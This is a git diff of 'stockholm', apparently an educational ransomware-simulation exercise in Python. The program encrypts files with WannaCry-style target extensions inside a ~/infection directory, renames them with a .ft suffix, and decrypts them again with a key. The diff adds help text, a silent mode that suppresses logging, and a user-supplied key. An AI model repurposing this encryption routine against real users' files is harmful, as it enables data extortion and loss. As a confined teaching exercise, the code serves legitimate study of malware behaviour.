@@ -26,6 +26,20 @@ EXTENSION = [
     ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".eml", ".msg", ".ost", ".pst", ".pptx", ".ppt", ".xlsx", ".xls", ".docx", ".doc"
     ]
 
+DESCRIPTION = '''\
+-----------------------------------------------------------------------------------------------------------
+Discription:
+ A simulated malware program that mimics ransomware behavior by encrypting all files 
+ in a target directory. The program can also reverse the encryption using a provided key.
+-----------------------------------------------------------------------------------------------------------'''
+
+EPILOG = '''\
+-----------------------------------------------------------------------------------------------------------
+• The target directory must be named "infection" and located within the user’s HOME directory.
+• The provided key must be at least 16 characters long.
+• This program targets common file extensions associated with ransomware like WannaCry.
+-----------------------------------------------------------------------------------------------------------'''
+
 #TODO • It must be developed for the Linux platform.
 #       option "–help" or "-h" to display the help.
 #       option "–version" or "-v" to show the version of
@@ -50,15 +64,16 @@ EXTENSION = [
 
 def main() -> int:
     try:
-        called_path = Path('.')
-        if not called_path.cwd() in [Path("/home/infection"), Path("~/infection"), Path(os.environ["HOME"] + "/infection")]:
-            return error("invalid called path directory.", 1)
         args = arguments_parser()
+        called_path = Path('.')
+        if called_path.cwd() != Path(os.environ["HOME"] + "/infection"):
+            return error("invalid called path directory.", 1)
         if args.reverse:
-            if len(args.reverse) < 16 : return error("Invalid key format.", 1)
+            if len(args.reverse) < 16:
+                return error("Invalid key format.", 1)
             recusive_directory_and(decryption, called_path, args.silent, args.reverse.encode('utf-8'))
         else:
-            recusive_directory_and(encryption, called_path, args.silent, KEY)
+            recusive_directory_and(encryption, called_path, args.silent, args.key if args.key else KEY)
     except Exception as e:
         return error(e, 1)
     except KeyboardInterrupt:
@@ -76,12 +91,12 @@ def key_derivation(key: str):
 def recusive_directory_and(func, directory: Path, silent: bool, key: str) -> None:
     for item in directory.iterdir():
         if item.is_file():
-            func(item, key)
+            func(item, key, silent)
         else:
             print(f"{Fore.YELLOW}[directory]{Style.RESET_ALL} {item.absolute()}")
             recusive_directory_and(func, item, silent, key)
 
-def encryption(file: Path, key: str):
+def encryption(file: Path, key: str, silent: bool):
     try:
         if (file.suffix in EXTENSION):
             hkey = key_derivation(key)
@@ -91,13 +106,14 @@ def encryption(file: Path, key: str):
             encrypted = cipher.encrypt(IV, content, None)
             with open(file, 'bw') as f:
                 f.write(encrypted);
-            print(f"{Fore.BLUE}[encrytped] {Fore.GREEN}{file.name}{Style.RESET_ALL} -> {Fore.RED}{file.name}.ft{Style.RESET_ALL}")
+            if not silent:
+                print(f"{Fore.BLUE}[encrytped] {Fore.GREEN}{file.name}{Style.RESET_ALL} -> {Fore.RED}{file.name}.ft{Style.RESET_ALL}")
             file.rename(f"{file.absolute()}.ft")
     except Exception as e:
         return error(e, 1);
     return
 
-def decryption(file, key):
+def decryption(file: Path, key: str, silent: bool):
     try:
         if (file.suffix == ".ft"):
             hkey = key_derivation(key)
@@ -109,20 +125,22 @@ def decryption(file, key):
                 f.write(content)
             file_name = str(file.absolute())[:-3];
             file.rename(file_name)
-            print(f"{Fore.BLUE}[encrytped] {Fore.RED}{file.name}{Style.RESET_ALL} -> {Fore.GREEN}{file.name[:-3]}{Style.RESET_ALL}")
+            if not silent:
+                print(f"{Fore.BLUE}[encrytped] {Fore.RED}{file.name}{Style.RESET_ALL} -> {Fore.GREEN}{file.name[:-3]}{Style.RESET_ALL}")
     except Exception as e:
         pass
     return
 
 def arguments_parser() -> argparse.ArgumentParser:
-    parser = argparse.ArgumentParser(prog="stockholm", 
-                                        description="this program are ....", )
+    parser = argparse.ArgumentParser(prog="stockholm", formatter_class=argparse.RawDescriptionHelpFormatter,
+        description=DESCRIPTION, epilog=EPILOG)
     parser.add_argument("-v", "--version", action="version", version="%(prog)s v.1.0.1",
-                        help=": show to version of the programe.")
+                        help="Show the version of the program.")
     parser.add_argument("-s", "--silent", action="store_true",
-                        help=": " )
+                        help="Run the program without producing any log output." )
     parser.add_argument("-r", "--reverse", type=str, metavar="KEY",
-                        help=": hello")# follow by key as argument.
+                        help="Reverse the encryption using the given key.")
+    parser.add_argument("key", type=str, metavar="KEY", nargs='?' )
     return parser.parse_args()
 
 
